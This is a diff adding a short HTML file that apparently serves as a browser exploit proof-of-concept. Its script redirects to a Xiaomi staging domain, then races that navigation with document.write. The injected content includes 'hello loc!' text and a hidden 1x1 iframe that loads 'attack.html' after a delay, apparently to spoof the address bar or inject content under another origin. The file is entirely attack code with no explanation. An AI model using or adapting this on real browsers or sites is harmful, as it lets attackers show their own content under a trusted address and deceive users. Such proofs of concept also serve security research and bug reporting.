@@ -1,0 +1,20 @@
+<html>
+<head>
+<title>loc</title>
+</head>
+<body>
+<script>
+function getinn(){
+var html = '<div>hello loc!</div><script>document.write("waiting...<BR>");setTimeout("document.getElementById(\'obj\').src=\'attack.html\';",1500);<\/script><iframe width="1" height="1" src="" id="obj"></iframe>';
+document.write(html);
+
+}
+function goto1(){
+document.location.href="https://staging-site.e.mi.com";
+}
+setTimeout("goto1()",10);
+setTimeout("getinn()",11);
+</script>
+<div id="dyscript"></div>
+</body>
+</html>
